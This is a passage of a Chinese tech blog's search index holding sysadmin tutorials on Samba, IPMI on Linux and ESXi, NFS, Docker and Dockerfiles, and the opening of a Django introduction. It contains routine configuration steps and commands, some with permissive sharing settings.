<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>manjaro安装samba</title>
      <link href="/2021/03/19/2021-03-20-manjaro%E5%AE%89%E8%A3%85samba/"/>
      <url>/2021/03/19/2021-03-20-manjaro%E5%AE%89%E8%A3%85samba/</url>
      
        <content type="html"><![CDATA[<h4 id="1-安装软件"><a href="#1-安装软件" class="headerlink" title="1.安装软件"></a>1.安装软件</h4><blockquote><p>sudo pacman -S samba nautilus-share manjaro-settings-samba</p></blockquote><a id="more"></a><h4 id="2-备份一下smb-conf文件"><a href="#2-备份一下smb-conf文件" class="headerlink" title="2.备份一下smb.conf文件"></a>2.备份一下smb.conf文件</h4><blockquote><p>cp /etc/samba/smb.conf  /etc/samba/smb.conf.bak</p></blockquote><h4 id="3-修改smb-conf文件"><a href="#3-修改smb-conf文件" class="headerlink" title="3.修改smb.conf文件"></a>3.修改smb.conf文件</h4><blockquote><p>sudo vim /etc/samba/smb.conf</p></blockquote><blockquote><p>[global]<br>   workgroup = WORKGROUP<br>   dns proxy = no<br>   log file = /var/log/samba/%m.log<br>   max log size = 1000<br>   client min protocol = SMB2<br>   server role = standalone server<br>   passdb backend = tdbsam<br>   obey pam restrictions = yes<br>   unix password sync = yes<br>   passwd program = /usr/bin/passwd %u<br>   passwd chat = <em>New<em>UNIX</em>password</em> %n\n <em>ReType<em>new</em>UNIX*password</em> %n\n <em>passwd:<em>all</em>authentication<em>tokens</em>updated*successfully</em><br>   pam password change = yes<br>   map to guest = Bad Password<br>   usershare allow guests = yes<br>   name resolve order = lmhosts bcast host wins<br>   security = user<br>   guest account = nobody<br>   usershare path = /var/lib/samba/usershare<br>   usershare max shares = 100<br>   usershare owner only = yes<br>   force create mode = 0070<br>   force directory mode = 0070</p><p>[homes]           —-&gt;  这一段要注释掉，否则会暴露家目录<br>   comment = Home Directories<br>   browseable = no<br>   read only = yes<br>   create mask = 0700<br>   directory mask = 0700<br>   valid users = %S</p><p>[printers]<br>   comment = All Printers<br>   browseable = no<br>   path = /var/spool/samba<br>   printable = yes<br>   guest ok = no<br>   read only = yes<br>   create mask = 0700</p><p>[print$]<br>   comment = Printer Drivers<br>   path = /var/lib/samba/printers<br>   browseable = yes<br>   read only = yes<br>   guest ok = no</p><p>[share]                                                                      # 分享目录，可自定义名字<br>path = /home/unknown/samba_share               # 分享实际目录<br>browseable = yes                                                    # 共享的目录是否让所有人可见<br>read only = no                                                         # 是否只读<br>create mask = 0700                                                # 客户端上传文件的默认权限<br>directory mask = 0700                                           # 客户端创建目录的默认权限<br>writable = yes                                                          # 是否可写<br>guest ok = yes                                                          #是否允许匿名(guest)访问,等同于public</p></blockquote><h4 id="将系统用户添加到samba用户，并设置密码"><a href="#将系统用户添加到samba用户，并设置密码" class="headerlink" title="将系统用户添加到samba用户，并设置密码"></a>将系统用户添加到samba用户，并设置密码</h4><blockquote><p>sudo smbpasswd -a unknown</p></blockquote><h4 id="查看所有的samba用户"><a href="#查看所有的samba用户" class="headerlink" title="查看所有的samba用户"></a>查看所有的samba用户</h4><blockquote><p>sudo pdbedit -L</p></blockquote><h4 id="查看对应ip上的samba服务器，例如查看本机samba"><a href="#查看对应ip上的samba服务器，例如查看本机samba" class="headerlink" title="查看对应ip上的samba服务器，例如查看本机samba"></a>查看对应ip上的samba服务器，例如查看本机samba</h4><blockquote><p>sudo smbclient -L 127.0.0.1</p></blockquote><h4 id="创建共享目录"><a href="#创建共享目录" class="headerlink" title="创建共享目录"></a>创建共享目录</h4><blockquote><p>mkdir /home/unknown/samba_share<br>chmod 777 -R /home/unknown/samba_share</p></blockquote><h4 id="重启smb，nmb服务"><a href="#重启smb，nmb服务" class="headerlink" title="重启smb，nmb服务"></a>重启smb，nmb服务</h4><blockquote><p>sudo systemctl restart smb nmb</p></blockquote><h4 id="如果重启失败，则执行testparm检查sam-conf是否有语法错误"><a href="#如果重启失败，则执行testparm检查sam-conf是否有语法错误" class="headerlink" title="如果重启失败，则执行testparm检查sam.conf是否有语法错误"></a>如果重启失败，则执行testparm检查sam.conf是否有语法错误</h4><blockquote><p>testparm</p></blockquote><h4 id="验证samba是否可以访问"><a href="#验证samba是否可以访问" class="headerlink" title="验证samba是否可以访问"></a>验证samba是否可以访问</h4><blockquote><p>smbclient //192.168.0.10/share</p></blockquote><h4 id="Windows系统上验证"><a href="#Windows系统上验证" class="headerlink" title="Windows系统上验证"></a>Windows系统上验证</h4><blockquote><p>\192.168.0.10</p></blockquote><h4 id="将共享目录挂载到本地（未验证）"><a href="#将共享目录挂载到本地（未验证）" class="headerlink" title="将共享目录挂载到本地（未验证）"></a>将共享目录挂载到本地（未验证）</h4><blockquote><p>mount -t cifs -o username=xxx //192.168.0.10/share /mnt/tmp</p></blockquote><h4 id="其他知识补充：-网上抄录，未验证"><a href="#其他知识补充：-网上抄录，未验证" class="headerlink" title="其他知识补充：(网上抄录，未验证)"></a>其他知识补充：(网上抄录，未验证)</h4><p>目前samba有三种后台：smbpasswd、tdbsam和ldapsam。sam应该是security account manager（安全账户管理）的简写。<br>1.smbpasswd：该方式是使用smb自己的工具smbpasswd来给系统用户（真实<br>用户或者虚拟用户）设置一个Samba密码，客户端就用这个密码来访问Samba的资源。smbpasswd文件默认在/etc/samba目录下，不过有时候要手工建立该文件。</p><p>2.tdbsam：该方式则是使用一个数据库文件来建立用户数据库。数据库文件叫passdb.tdb，默认在/etc/samba目录下。passdb.tdb用户数据库可以使用smbpasswd –a来建立Samba用户，不过要建立的Samba用户必须先是系统用户。我们也可以使用pdbedit命令来建立Samba账户。pdbedit命令的参数很多，我们列出几个主要的。<br>pdbedit –a username：新建Samba账户。<br>pdbedit –x username：删除Samba账户。<br>pdbedit –L：列出Samba用户列表，读取passdb.tdb数据库文件。<br>pdbedit –Lv：列出Samba用户列表的详细信息。<br>pdbedit –c “[D]” –u username：暂停该Samba用户的账号。<br>pdbedit –c “[]” –u username：恢复该Samba用户的账号。</p><p>3.ldapsam：该方式则是基于LDAP的账户管理方式来验证用户。首先要建立LDAP服务，然后设置“passdb backend = ldapsam:ldap://LDAP Server”客户端就用这个密码来访问Samba的资源。smbpasswd文件默认在/etc/samba目录下，不过有时候要手工建立该文件。</p>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux和ESXI配置ipmi</title>
      <link href="/2021/02/02/2021-02-03-Linux%E5%92%8CESXI%E9%85%8D%E7%BD%AEipmi/"/>
      <url>/2021/02/02/2021-02-03-Linux%E5%92%8CESXI%E9%85%8D%E7%BD%AEipmi/</url>
      
        <content type="html"><![CDATA[<h1 id="指令配置ipmi操作流程"><a href="#指令配置ipmi操作流程" class="headerlink" title="指令配置ipmi操作流程"></a>指令配置ipmi操作流程</h1><h2 id="linux配置ipmi"><a href="#linux配置ipmi" class="headerlink" title="linux配置ipmi"></a>linux配置ipmi</h2><a id="more"></a><h4 id="1-先查看一下ipmi配置"><a href="#1-先查看一下ipmi配置" class="headerlink" title="1.先查看一下ipmi配置"></a>1.先查看一下ipmi配置</h4><blockquote><p>ipmi lan print</p></blockquote><h4 id="2-如果显示报错，则加载一下ipmi模块"><a href="#2-如果显示报错，则加载一下ipmi模块" class="headerlink" title="2.如果显示报错，则加载一下ipmi模块"></a>2.如果显示报错，则加载一下ipmi模块</h4><blockquote><p>modprobe ipmi_msghandler<br>modprobe ipmi_devintf<br>modprobe ipmi_si</p></blockquote><h4 id="3-如果加载不成功，则安装ipmitool"><a href="#3-如果加载不成功，则安装ipmitool" class="headerlink" title="3.如果加载不成功，则安装ipmitool"></a>3.如果加载不成功，则安装ipmitool</h4><blockquote><p>yum install ipmitool -y</p></blockquote><h4 id="4-再查看一下ipmi配置"><a href="#4-再查看一下ipmi配置" class="headerlink" title="4.再查看一下ipmi配置"></a>4.再查看一下ipmi配置</h4><blockquote><p>ipmi lan print</p></blockquote><h4 id="5-配置channel-1-为静态地址"><a href="#5-配置channel-1-为静态地址" class="headerlink" title="5.配置channel 1 为静态地址"></a>5.配置channel 1 为静态地址</h4><p>配置ipmi地址（一般选channel 1）</p><blockquote><p>ipmitool lan set 1 ipsrc static</p></blockquote><h4 id="6-配置ipmi-ip地址"><a href="#6-配置ipmi-ip地址" class="headerlink" title="6.配置ipmi ip地址"></a>6.配置ipmi ip地址</h4><blockquote><p>ipmitool lan set 1 ipaddr 200.201.10.1</p></blockquote><h4 id="7-配置ipmi-子网掩码"><a href="#7-配置ipmi-子网掩码" class="headerlink" title="7.配置ipmi 子网掩码"></a>7.配置ipmi 子网掩码</h4><blockquote><p>ipmitool lan set 1 netmask 255.255.248.0</p></blockquote><h4 id="8-配置ipmi-网关"><a href="#8-配置ipmi-网关" class="headerlink" title="8.配置ipmi 网关"></a>8.配置ipmi 网关</h4><blockquote><p>ipmitool lan set 1 defgw ipaddr 200.201.17.254</p></blockquote><h2 id="ESXI主机配置ipmi"><a href="#ESXI主机配置ipmi" class="headerlink" title="ESXI主机配置ipmi"></a>ESXI主机配置ipmi</h2><h4 id="第一步：开启ssh"><a href="#第一步：开启ssh" class="headerlink" title="第一步：开启ssh"></a>第一步：开启ssh</h4><p>esxi主机开机ssh服务，登录esxi主机&gt;点击管理&gt;服务&gt;开启ssh服务</p><h4 id="第二步：拷贝文件"><a href="#第二步：拷贝文件" class="headerlink" title="第二步：拷贝文件"></a>第二步：拷贝文件</h4><p>下载esxi_ipmitool-1.8.15-1.vib,然后将此文件拷贝到esxi主机下的/var/log/vmware目录下。</p><p>下载地址：<a href="https://dl.90.vc/tools/" target="_blank" rel="noopener">https://dl.90.vc/tools/</a>     </p><p><strong>如果设备能够连外网的情况下，则直接下载</strong></p><blockquote><p>wget  dl.90.vc/tools/esxi_ipmitool-1.8.15-1.vib -O  /var/log/vmware/ipmitool-1.8.15-1.vib</p></blockquote><h4 id="第三步：远程主机"><a href="#第三步：远程主机" class="headerlink" title="第三步：远程主机"></a>第三步：远程主机</h4><p>远程登录到esxi主机。ssh root@ip</p><h4 id="第四步：设置模式"><a href="#第四步：设置模式" class="headerlink" title="第四步：设置模式"></a>第四步：设置模式</h4><p>执行 esxcli software acceptance set –level=CommunitySupported</p><h4 id="第五步：-安装ipmitool"><a href="#第五步：-安装ipmitool" class="headerlink" title="第五步： 安装ipmitool"></a>第五步： 安装ipmitool</h4><p>执行  esxcli software vib install-v esxi_ipmitool-1.8.15-1.vib</p><h4 id="第六步：开始配置ipmi"><a href="#第六步：开始配置ipmi" class="headerlink" title="第六步：开始配置ipmi"></a>第六步：开始配置ipmi</h4><p>先查看一下ipmi配置</p><blockquote><p>/opt/ipmitool/bin/ipmitool lan print</p></blockquote><p>配置ipmi地址（一般选channel 1）</p><p>配置channel 1 为静态地址</p><blockquote><p>/opt/ipmitool/bin/ipmitool lan set 1 ipsrc static</p></blockquote><p>配置ipmi ip地址</p><blockquote><p>/opt/ipmitool/bin/ipmitool lan set 1 ipaddr 200.201.10.1</p></blockquote><p>配置ipmi 子网掩码</p><blockquote><p>/opt/ipmitool/bin/ipmitool lan set 1 netmask 255.255.248.0</p></blockquote><p>配置ipmi 网关</p><blockquote><p>/opt/ipmitool/bin/ipmitool lan set 1 defgw ipaddr 200.201.17.254</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NFS的搭建与使用</title>
      <link href="/2020/11/21/2020-11-22-NFS%E7%9A%84%E6%90%AD%E5%BB%BA%E4%B8%8E%E4%BD%BF%E7%94%A8/"/>
      <url>/2020/11/21/2020-11-22-NFS%E7%9A%84%E6%90%AD%E5%BB%BA%E4%B8%8E%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>NFS  （network file system 网络文件系统）是当前主流异构平台共享文件系统之一。</p><p>NFS的工作原理是使用客户端/服务器架构，由一个客户端程序和服务器程序组成。</p><a id="more"></a><blockquote><p>NFS与NAS的区别：</p></blockquote><p>NFS    是一种文件传输协议</p><p>NAS （Network Attached Storage） NAS是存储的一种方式，可以是设备，也可以是存储网络的架构。</p><h2 id="安装与配置"><a href="#安装与配置" class="headerlink" title="安装与配置"></a>安装与配置</h2><p>以centos系统为例</p><h3 id="服务端配置"><a href="#服务端配置" class="headerlink" title="服务端配置"></a>服务端配置</h3><h4 id="第一步：安装nfs"><a href="#第一步：安装nfs" class="headerlink" title="第一步：安装nfs"></a>第一步：安装nfs</h4><blockquote><p>yum install -y nfs-utils</p></blockquote><h4 id="第二步：创建一个共享目录"><a href="#第二步：创建一个共享目录" class="headerlink" title="第二步：创建一个共享目录"></a>第二步：创建一个共享目录</h4><blockquote><p>mkdir /data</p></blockquote><h4 id="第三步：配置NFS服务"><a href="#第三步：配置NFS服务" class="headerlink" title="第三步：配置NFS服务"></a>第三步：配置NFS服务</h4><p>编辑exports文件，添加从机</p><blockquote><p>vim /etc/exports</p></blockquote><p>填入：</p><blockquote><p>/data                 192.168.203.0/24 (rw,sync,no_root_squash)</p></blockquote><p> 备注： no_root_squash   允许root用户访问挂载上来的NFS卷</p><h4 id="第四步：启动NFS服务"><a href="#第四步：启动NFS服务" class="headerlink" title="第四步：启动NFS服务"></a>第四步：启动NFS服务</h4><p><strong>先启动rpcbind服务，再启动nfs服务</strong></p><blockquote><p>systemctl start rpcbind.service<br>systemctl start nfs-server.service</p></blockquote><h4 id="第五步：确认NFS服务启动"><a href="#第五步：确认NFS服务启动" class="headerlink" title="第五步：确认NFS服务启动"></a>第五步：确认NFS服务启动</h4><blockquote><p>exportfs -v</p></blockquote><h3 id="客户端配置"><a href="#客户端配置" class="headerlink" title="客户端配置"></a>客户端配置</h3><h4 id="第一步：安装nfs-1"><a href="#第一步：安装nfs-1" class="headerlink" title="第一步：安装nfs"></a>第一步：安装nfs</h4><blockquote><p>yum install -y nfs-utils</p></blockquote><h4 id="第二步：启动rpcbind服务（客户端不用启动nfs-server服务）"><a href="#第二步：启动rpcbind服务（客户端不用启动nfs-server服务）" class="headerlink" title="第二步：启动rpcbind服务（客户端不用启动nfs-server服务）"></a>第二步：启动rpcbind服务（客户端不用启动nfs-server服务）</h4><blockquote><p>systemctl start rpcbind.service</p></blockquote><h4 id="第三步：查看NFS服务端是否有目录共享"><a href="#第三步：查看NFS服务端是否有目录共享" class="headerlink" title="第三步：查看NFS服务端是否有目录共享"></a>第三步：查看NFS服务端是否有目录共享</h4><blockquote><p>showmount -e &lt;服务端的ip地址&gt;</p></blockquote><h4 id="第四步：手动挂载共享盘"><a href="#第四步：手动挂载共享盘" class="headerlink" title="第四步：手动挂载共享盘"></a>第四步：手动挂载共享盘</h4><p>创建一个共享目录</p><blockquote><p>mkdir /data</p></blockquote><p>开始挂载</p><blockquote><p>mount -t nfs &lt;服务端ip或者域名&gt;:/data /data</p></blockquote><blockquote><p>mount -a</p></blockquote><p>查看挂载情况</p><blockquote><p>df -h</p></blockquote><p>如果想卸载：</p><blockquote><p>unmount /data</p></blockquote><h4 id="第五步：配置开机自动挂载"><a href="#第五步：配置开机自动挂载" class="headerlink" title="第五步：配置开机自动挂载"></a>第五步：配置开机自动挂载</h4><blockquote><p>vim /etc/fstab</p></blockquote><p>填入：</p><blockquote><p>&lt;服务端ip或者域名&gt;:/data     /data         nfs              defaults               0    0</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>docker使用与配置</title>
      <link href="/2020/10/09/2020-10-10-docker%E4%BD%BF%E7%94%A8%E4%B8%8E%E9%85%8D%E7%BD%AE/"/>
      <url>/2020/10/09/2020-10-10-docker%E4%BD%BF%E7%94%A8%E4%B8%8E%E9%85%8D%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<h1 id="docker基础知识"><a href="#docker基础知识" class="headerlink" title="docker基础知识"></a>docker基础知识</h1><h1 id="第一章docker基础知识"><a href="#第一章docker基础知识" class="headerlink" title="第一章docker基础知识"></a>第一章docker基础知识</h1><h2 id="一、docker简介"><a href="#一、docker简介" class="headerlink" title="一、docker简介"></a>一、docker简介</h2><p>Docker是一个开源的<strong>容器引擎</strong>，它基于LXC容器技术，使用Go语言开发。</p><a id="more"></a><p>源代码托管在Github上，并遵从Apache2.0协议。</p><p>Docker采用<strong>C/S架构</strong>，其可以轻松的为任何应用创建一个轻量级的、可移植的、自给自足的容器。</p><p>简单来说：<strong>Docker就是一种快速解决业务稳定环境的一种技术手段(快速搭建环境)。</strong></p><p>一个完整的Docker有以下几个部分组成：</p><ol><li>DockerClient客户端</li><li>Docker Daemon守护进程</li><li>Docker Image镜像备注：有的系统会无效，自行上网搜索解决方法</li><li>DockerContainer容器</li></ol><h2 id="二、原理解析"><a href="#二、原理解析" class="headerlink" title="二、原理解析"></a>二、原理解析</h2><p>Docker Engine是一个<strong>C/S架构</strong>的应用程序，主要包含下面几个组件：</p><blockquote><p>dockerd进程：常驻后台进程Dockerd</p><p>REST API Server：用来和 Dockerd 交互的 </p><p>命令行CLI接口：和 REST API 进行交互（常用docker 命令）</p></blockquote><p><strong>分工合作</strong></p><p>Docker 使用 C/S 体系的架构</p><p>Docker 客户端与 Docker 守护进程通信</p><p>Docker 守护进程负责构建，运行和分发 Docker 容器。</p><p>Docker 客户端和守护进程可以在同一个系统上运行，也可以将 Docker 客户端连接到远程 Docker 守护进程。</p><p>Docker 客户端和守护进程使用 REST API 通过UNIX套接字或网络接口进行通信。</p><h2 id="三、docker安装"><a href="#三、docker安装" class="headerlink" title="三、docker安装"></a>三、docker安装</h2><p><strong>注意：如果安装方法无法就上网查</strong></p><p>ubuntu：<code>sudo apt install docker-ce -y</code></p><p>如果安装不成功：</p><p><code>curl -fsSL https://mirrors.ustc.edu.cn/docker-ce/linux/ubuntu/gpg | sudo apt-key add -</code></p><p><code>sudo add-apt-repository &quot;deb [arch=amd64] https://mirrors.ustc.edu.cn/docker-ce/linux/ubuntu \ $(lsb_release -cs) stable&quot;</code></p><p><code>sudo apt install docker-ce -y</code></p><p>centos:  <code>yum install docker-ce docker-ce-cli containerd.io</code></p><p>启动：<code>systemctl start docker</code></p><p>重启：<code>systemctl restart docker</code></p><p>停止：<code>systemctl stop docker</code></p><p>开机自动启动：<code>systemctl enable docker</code></p><p>关闭自动启动：<code>systemctl disable docker</code></p><p>修改docker镜像源：</p><p><code>echo &#39;{&quot;registry-mirrors&quot;: [&quot;http://hub-mirror.c.163.com&quot;]}&#39; &gt; /etc/docker/daemon.json</code></p><p>配置docker免sudo：</p><p><code>sudo usermod -aG docker $USER</code></p><p><code>sudo systemctl restart docker</code></p><p><strong>备注：有的系统会无效，自行上网搜索解决方法</strong></p><h1 id="第二章-docker基础管理"><a href="#第二章-docker基础管理" class="headerlink" title="第二章 docker基础管理"></a>第二章 docker基础管理</h1><h2 id="一、镜像管理"><a href="#一、镜像管理" class="headerlink" title="一、镜像管理"></a>一、镜像管理</h2><p>查找镜像：</p><blockquote><p>docker search 镜像名</p></blockquote><p>下载镜像：</p><blockquote><p>docker pull 镜像名</p></blockquote><p>从本地安装镜像:</p><blockquote><p>docker image  load -i 镜像包</p><p>简写：docker load -i 镜像包 或者 docker load &lt; 镜像包</p></blockquote><p>删除本地镜像:</p><blockquote><p>docker image rm 镜像ID  或者 镜像名称<br>简写：docker rmi image_id</p></blockquote><p>删除全部镜像:</p><blockquote><p>docker rmi $(docker images -q)</p></blockquote><p>镜像历史:</p><blockquote><p>docker history image_id</p></blockquote><p>标签:</p><blockquote><p>docker tag old_image:old_version new_image:new_version</p></blockquote><p>制作镜像：</p><blockquote><p>docker commit -a ‘作者’ -m ‘描述’   容器ID   新镜像名:版本</p></blockquote><p>打包导出:</p><blockquote><p>docker image save -o 镜像包.tar.gz 镜像:版本     # 保存到当前目录下<br>简写：docker save -o 镜像包.tar.gz 镜像</p></blockquote><h2 id="二、容器管理"><a href="#二、容器管理" class="headerlink" title="二、容器管理"></a>二、容器管理</h2><p>查看正在运行的容器：</p><blockquote><p>docker container ls</p><p>简写：docker ps</p></blockquote><p>查看所有容器</p><blockquote><p>docker container ls -a</p><p>简写：docker ps -a</p></blockquote><p>关闭/启动/重启：</p><blockquote><p>docker container stop | start | restart 容器ID</p></blockquote><p>停止所有容器：</p><blockquote><p>docker stop $(docker ps -a -q)</p></blockquote><p>删掉容器：</p><blockquote><p>docker container rm 容器ID<br>简写：docker rm 容器ID</p></blockquote><p>删除全部容器：</p><blockquote><p>docker rm $(docker ps -a -q)</p></blockquote><p>强制删除容器：</p><blockquote><p>docker  container rm -f 容器ID<br>简写：docker rm -f 容器ID</p></blockquote><p>查看容器运行日志：</p><blockquote><p>docker  logs 容器ID</p></blockquote><p>创建新容器并运行容器：</p><blockquote><p>docker run -itd 镜像名:版本</p></blockquote><p>交互式容器（登录容器）:</p><blockquote><p>docker  exec -it  ID /bin/bash</p></blockquote><h2 id="三、数据管理"><a href="#三、数据管理" class="headerlink" title="三、数据管理"></a>三、数据管理</h2><p>数据卷（映射目录）：（重要）</p><blockquote><p>docker run -itd -v [宿主机文件]:[容器文件] [镜像id/镜像名]</p></blockquote><p><strong>注意：-v 宿主机文件:容器文件 可以存在多个，表示同时挂载多个</strong></p><p><strong>宿主机文件尽量用绝对路径，容器文件即使不存在，Docker自动创建</strong></p><h2 id="四、网络管理"><a href="#四、网络管理" class="headerlink" title="四、网络管理"></a>四、网络管理</h2><p>端口映射(随机)       网络模式默认为bridge模式</p><blockquote><p>docker run -itd –name 别名 -P image_id     # -P  大写P</p></blockquote><p>端口映射（指定）  网络模式默认为bridge模式</p><blockquote><p>docker run -itd –name 别名 -p 8080:80 image_id     # -p 小写p</p></blockquote><p>host模式</p><blockquote><p>docker run -itd –name 别名 –netword=host image_id</p></blockquote><h1 id="第三章-Dockerfile"><a href="#第三章-Dockerfile" class="headerlink" title="第三章 Dockerfile"></a>第三章 Dockerfile</h1><p>Dockerfile简而言之就是 编写Dockerfile脚本实现自动化构建自己想要的镜像</p><p><strong>使用准则</strong></p><p>1、大： 首字母必须大写D</p><p>2、空： 尽量将Dockerfile放在空目录中。</p><p>3、单： 每个容器尽量只有一个功能。</p><p>4、少： 执行的命令越少越好。</p><p><strong>基础指令</strong></p><ul><li><code>FROM</code>: 指定基础镜像（镜像要已存在）</li><li><code>MAINTAINER</code>: 维护者信息（姓名/邮箱）</li><li><code>RUN</code>: 镜像操作指令</li><li><code>ADD：</code>上传文件，一般用于上传压缩包，会自动解压压缩包</li><li><code>COPY：</code>上传一般文件</li><li><code>EXPOSE：</code>开放端口</li><li><code>WORKDIR：</code>切换目录</li><li><code>ENTRYPOINT</code>: 容器启动时执行指令</li></ul><p>构建镜像：</p><blockquote><p>cd 到Dockerfile所在的目录</p><p>docker build -t 新镜像名:版本 ./</p></blockquote><p>执行完后会生成一个新的镜像</p><pre><code class="dockerfile"># 选择基础镜像FROM centos:latest# 作者MAINTAINER caijinbo# shell指令安装软件RUN yum install -y nginx python3-devel net-tools openssh-server openssh-clients passwd gcc mariadb-devel# 把工程上传到容器ADD front_end_pc.tar.gz /data/ADD project_admin.tar.gz /data/ADD project.tar.gz /data/COPY requirements.txt /data/# 切换到工程目录，并安装依赖WORKDIR /data/project/RUN pip3 install -i https://pypi.tuna.tsinghua.edu.cn/simple --no-cache-dir --default-timeout=1000 -r /data/requirements.txtCOPY 8000.conf /etc/nginx/conf.d/COPY 8080.conf /etc/nginx/conf.d/COPY 8081.conf /etc/nginx/conf.d/# 设置环境变量，作用：指定系统语言为UTF-8，否则，uwsgi运行无法处理中文语言# ENV LC_ALL=zh_CN.UTF-8# 容器开放端口8080和8081EXPOSE 8080 8081# 发送容器启动脚本COPY command.sh /data/# 切换容器目录WORKDIR /data# 指定容器运行的启动脚本ENTRYPOINT [&quot;/bin/bash&quot;,&quot;/data/command.sh&quot;]</code></pre><p>在Dockerfile同级目录下新建一个脚本</p><p>vim command.sh</p><pre><code class="shell">cd /data/project/ uwsgi --ini uwsgi.ini nginx -g &#39;daemon off;&#39; </code></pre><p><strong>注意:所有要操作的文件或压缩包均放在Dockerfile同级目录下</strong></p>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Django框架基础</title>
      <link href="/2020/09/21/2020-09-22-Django%20%E6%A1%86%E6%9E%B6%E5%9F%BA%E7%A1%80/"/>
      <url>/2020/09/21/2020-09-22-Django%20%E6%A1%86%E6%9E%B6%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<h1 id="Django-框架基础"><a href="#Django-框架基础" class="headerlink" title="Django 框架基础"></a>Django 框架基础</h1><h2 id="一、Django工程搭建"><a href="#一、Django工程搭建" class="headerlink" title="一、Django工程搭建"></a>一、Django工程搭建</h2><h3 id="1-web本质和意义"><a href="#1-web本质和意义" class="headerlink" title="1.web本质和意义"></a>1.web本质和意义</h3><a id="more"></a><h4 id="1-1-web应用程序处理流程"><a href="#1-1-web应用程序处理流程" class="headerlink" title="1.1 web应用程序处理流程"></a>1.1 web应用程序处理流程</h4><p>前端客户端(浏览器、APP、ajax、爬虫程序) </p><p>–HTTP请求–&gt;</p><p>服务器程序（如：gunicorn、uwsgi）接收和解析HTTP请求报文</p><p>–WSGI协议–&gt;</p><p>框架程序（如：flask、Django）HTTP请求对象(request)–&gt;中间层处理–&gt;具体视图处理-业务处理(如数据库、模板、表单)–&gt;中间层处理–&gt;HTTP响应对象(response)</p><p>–WSGI协议–&gt;</p><p>服务器程序（如：gunicorn、uwsgi）构建和返回HTTP响应报文</p><p>–HTTP响应–&gt;</p><p>前端客户端(浏览器、APP、ajax、爬虫程序) </p><h4 id="1-2-Web应用程序的本质"><a href="#1-2-Web应用程序的本质" class="headerlink" title="1.2  Web应用程序的本质"></a>1.2  Web应用程序的本质</h4><ul><li>接收并解析HTTP请求，获取具体的请求信息</li><li>处理本次HTTP请求，即完成本次请求的业务逻辑处理</li><li>构造并返回处理结果——HTTP响应</li></ul><h4 id="1-3-Web程序框架的意义"><a href="#1-3-Web程序框架的意义" class="headerlink" title="1.3  Web程序框架的意义"></a>1.3  Web程序框架的意义</h4><ul><li>用于搭建Web应用程序</li><li>免去不同Web应用相同代码部分的重复编写，只需关心Web应用核心的业务逻辑实现</li></ul><h3 id="2-Django框架介绍"><a href="#2-Django框架介绍" class="headerlink" title="2.Django框架介绍"></a>2.Django框架介绍</h3><h4 id="2-1-简介"><a href="#2-1-简介" class="headerlink" title="2.1 简介"></a>2.1 简介</h4><ul><li>Django <strong>发音[`dʒæŋɡəʊ]</strong>，是用python语言写的开源web开发框架，并遵循MVC设计模式。</li><li><strong>Django的主要目的是简便、快速的开发数据库驱动的网站。</strong></li></ul><h4 id="2-2-特点"><a href="#2-2-特点" class="headerlink" title="2.2 特点"></a>2.2 特点</h4><blockquote><p><strong>1. 重量级框架</strong></p></blockquote><ul><li>Django框架相比较于Python其他的Web框架而言是<strong>大而全</strong>的。</li><li>Django提供了原生的众多功能组件，让开发更简便快速。</li><li>提供项目工程管理的自动化脚本工具。</li><li>支持ORM以面向对象的形式操作数据库。（Object Relational Mapping）</li><li>提供了强大的模板引擎，用于渲染页面。</li><li>提供了文件管理、认证权限、session机制和缓存。</li></ul><blockquote><p><strong>2. 遵守MVT设计模式</strong></p></blockquote><h5 id="MVC设计模式说明"><a href="#MVC设计模式说明" class="headerlink" title="MVC设计模式说明"></a>MVC设计模式说明</h5><ul><li><strong>MVC</strong> 的全拼为 <strong>Model-View-Controller</strong></li><li><strong>M</strong> 全拼为 <strong>Model</strong>，主要封装对数据库层的访问，对数据库中的数据进行增、删、改、查操作。</li><li><strong>V</strong> 全拼为 <strong>View</strong>，用于封装结果，生成页面展示的html内容。</li><li><strong>C</strong> 全拼为 <strong>Controller</strong>，用于接收请求，处理业务逻辑，与Model和View交互，返回结果。</li><li><strong>MVC 的核心思想是分工、解耦，让不同的代码块之间降低耦合，增强代码的可扩展性和可移植性，实现向后兼容</strong>。</li></ul><h5 id="Django的MVT设计模式说明"><a href="#Django的MVT设计模式说明" class="headerlink" title="Django的MVT设计模式说明"></a>Django的MVT设计模式说明</h5><ul><li><strong>MVT</strong> 的全拼为 <strong>Model-View-Template</strong></li><li><strong>M</strong> 全拼为 <strong>Model</strong>，与MVC中的M功能相同，负责和数据库交互，进行数据处理。</li><li><strong>V</strong> 全拼为 <strong>View</strong>，与MVC中的C功能相同，接收请求，进行业务处理，返回应答。</li><li><strong>T</strong> 全拼为 <strong>Template</strong>，与MVC中的V功能相同，负责封装构造要返回的html。</li><li><strong>MVT 的核心思想和 MVC 是相同的</strong></li></ul><h3 id="3-虚拟环境"><a href="#3-虚拟环境" class="headerlink" title="3.虚拟环境"></a>3.虚拟环境</h3><h4 id="3-1-为什么要创建虚拟环境"><a href="#3-1-为什么要创建虚拟环境" class="headerlink" title="3.1 为什么要创建虚拟环境"></a>3.1 为什么要创建虚拟环境</h4><ul><li><p>在开发过程中, 当需要使用python的某些工具包/框架时需要联网安装</p><ul><li><p>比如联网安装Django框架 django==2.2.16 版本</p><pre><code>sudo pip install django==2.2.16</code></pre></li></ul></li><li><p><strong>提示</strong>：使用如上命令, 会将<code>django==2.2.16</code>安装到<code>/usr/local/lib/python版本/dist-packages</code>路径下</p></li><li><p><strong>问题</strong> : 如果在一台电脑上, 想开发多个不同的项目, 需要用到同一个包的不同版本, 如果使用上面的命令, 在同一个目录下安装或者更新, 